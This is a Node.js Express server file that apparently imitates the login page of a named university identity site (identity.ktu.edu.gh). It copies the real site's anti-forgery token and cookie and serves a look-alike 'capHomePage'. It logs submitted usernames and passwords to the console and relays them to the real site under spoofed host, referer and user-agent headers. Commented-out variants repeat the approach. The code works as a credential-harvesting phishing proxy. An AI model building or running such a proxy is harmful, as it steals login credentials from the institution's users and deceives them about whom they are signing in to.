if (process.env.NODE_ENV !== "production") require("dotenv").config();

const axios = require("axios");
const cheerio = require("cheerio");
const express = require("express");
const app = express();
const morgan = require("morgan");
const cookieParser = require("cookie-parser");

app.use(cookieParser());
app.use(express.json());
app.use(express.urlencoded({extended: true}));
app.use(express.static("public"));
app.use(morgan("dev"));

app.set("view engine", "ejs");
app.set("views", __dirname + "/source/views");

app.listen(process.env.PORT_NO,process.env.INTERFACE_IP, () => {
    console.log(`Listening on port ${process.env.PORT_NO}`);
});

const url = "https://identity.ktu.edu.gh/Account/Login";

app.get("/", async (req, res) => {
    try {
      const response = await axios.get(url);
      console.log(response.headers["set-cookie"][0].split("=")[1].split(";")[0]);
      const cookieVerifToken = response.headers["set-cookie"][0].split("=")[1].split(";")[0];

      const $ = cheerio.load(response.data);

      const verifToken = $("input[name='__RequestVerificationToken']").attr("value");

      res.cookie(".AspNetCore.Antiforgery.X0e-rIfhNrk", cookieVerifToken, {
        httpOnly: true,
        secure: true,
        sameSite: true
      });
      res.render("capHomePage", {verifToken});
    } catch (err) {
      console.log(err.message);
    }
  }
);

app.post("/", async (req, res) => {
  const headers = req.headers;
  const cookie = headers.cookie;
  // const {Username, Password, button, RememberLogin, _RequestVerificationToken} = req.body;
  const newHeaders = headers;
  console.log(newHeaders);
  // newHeaders.origin = "identity.ktu.edu.gh";
  newHeaders.origin = null;
  newHeaders.host = "identity.ktu.edu.gh";
  newHeaders.referer = "identity.ktu.edu.gh/Account/Login";
  newHeaders["user-agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36";
  console.log(newHeaders);
  console.log(req.body);

  try {
    const response = await axios.post(url, {
      headers: newHeaders,
      body: {
        Username: req.body.Username,
        Password: req.body.Password,
        button: req.body.button,
        _RequestVerificationToken: req.body._RequestVerificationToken,
        RememberLogin: req.body.RememberLogin,
      }
    });
    console.log(response.data);
  } catch (err) {
    console.log(err.message);
  }

    // try {
    //     const response = await axios.post(url, {
    //     //     headers: {
    //     // //   "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36",
    //     //   "Cookie": cookie
    //     //   },
    //       body: {
    //         Username,
    //         Password,
    //         button,
    //         _RequestVerificationToken,
    //         RememberLogin
    //       }
    //     });
    // } catch (err) {
    //     console.log(err.message);
    // }
});

// app.get("/", async (req, res) => {
//     try {
//         const response = await axios.post(url, {
//           headers: {
//           "User-Agent":
//               "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36",
//           },
//           body: {
//             Username: "Hello123@ktu.edu.gh",
//             Password: "hi",
//             button: "login",
//             _RequestVerificationToken:
//               "CfDJ8LcHtGWTwLVKvX1gN92SuI0_tBtJBu2OLeGXEDXluTyFaAyrB6pDQgOQwvrVzrWACuO01ob8eowBSKcgE0PKEwtPm-wjmuzzkg6uV1q863z0XOg3UX6cvPYAcJ76kGGHQOwXJ0V15r3OAsRahBQ4JX0",
//             RememberLogin: false,
//           },
//         });
//         console.log(response.data);

//     } catch (err) {
//         console.log(err.message);
//     }
// });

// app.get("/", (req, res) => {
//     res.render("capHomePage");
//     // res.sendFile(__dirname +  "/public/page.html");
// });

// app.get("*", (req, res) => {
//     // res.render("capHomePage");
//     // console.log(req);
//     res.status(302).redirect("/");
// });

app.get("*", (req, res) => {
    res.status(302).redirect("/");
});